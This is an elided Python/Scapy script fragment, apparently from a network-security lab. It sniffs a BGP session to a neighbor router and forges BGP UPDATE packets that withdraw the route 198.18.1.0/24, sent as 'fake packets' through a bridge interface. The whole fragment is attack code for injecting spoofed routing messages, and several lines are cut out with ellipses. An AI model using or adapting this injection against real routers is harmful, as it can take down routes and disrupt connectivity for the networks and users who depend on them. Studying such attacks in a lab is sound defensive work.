...
# important! send fake packets only through our bridge!
conf.iface = 'br0'

load_contrib('bgp')

# Sniff for a BGP packet
# 3.3.3.3 is the neighbor IP of router ISP2
pkt = sniff(filter="tcp and ip dst 3.3.3.3",count=1)
...
for i in range (0, 2):
    ...
    bgp_remove = IP(src=ipsrc, dst=ipdst, ttl=1) \
                 ...
                 / BGPUpdate(withdrawn_routes_len=5, withdrawn_routes=[BGPNLRI_IPv4(prefix="198.18.1.0/24")])
